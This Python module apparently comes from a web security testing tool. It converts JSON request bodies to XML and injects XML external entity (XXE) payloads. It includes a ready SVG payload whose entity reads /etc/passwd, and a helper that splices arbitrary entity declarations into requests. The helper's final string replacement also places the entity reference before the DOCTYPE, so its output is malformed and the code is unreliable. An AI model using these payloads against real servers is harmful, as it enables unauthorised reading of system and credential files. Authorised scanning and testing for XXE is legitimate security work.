import json as json_mod
import logging
from typing import Optional

logger = logging.getLogger(__name__)

XML_CONTENT_TYPES = {"application/xml", "text/xml"}

SVG_MUTATION = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">'
    '&xxe;'
    "</svg>"
)


def json_to_xml(json_body: str) -> Optional[str]:
    try:
        data = json_mod.loads(json_body)
    except json_mod.JSONDecodeError:
        return None

    result = _dict_to_xml(data)
    if result is not None:
        return f'<?xml version="1.0" encoding="UTF-8"?>{result}'
    return None


def _dict_to_xml(data, root_name: str = "root") -> str:
    if isinstance(data, dict):
        parts = [f"<{root_name}>"]
        for key, val in data.items():
            child = _dict_to_xml(val, key)
            if child:
                parts.append(child)
        parts.append(f"</{root_name}>")
        return "".join(parts)
    if isinstance(data, list):
        parts = [f"<{root_name}>"]
        for item in data:
            child = _dict_to_xml(item, "item")
            if child:
                parts.append(child)
        parts.append(f"</{root_name}>")
        return "".join(parts)
    return f"<{root_name}>{_escape_xml(str(data))}</{root_name}>"


def _escape_xml(s: str) -> str:
    return (
        s.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&apos;")
    )


def build_xml_with_entity(
    json_body: str,
    entity_decl: str,
    entity_ref: str = "&xxe;",
) -> Optional[str]:
    xml_body = json_to_xml(json_body)
    if xml_body is None:
        return None
    doctype = f'<!DOCTYPE root [{entity_decl}]>'
    return xml_body.replace('<?xml version="1.0" encoding="UTF-8"?>', f'<?xml version="1.0" encoding="UTF-8"?>{doctype}').replace(">", f">{entity_ref}", 1) if "?>" in xml_body else xml_body
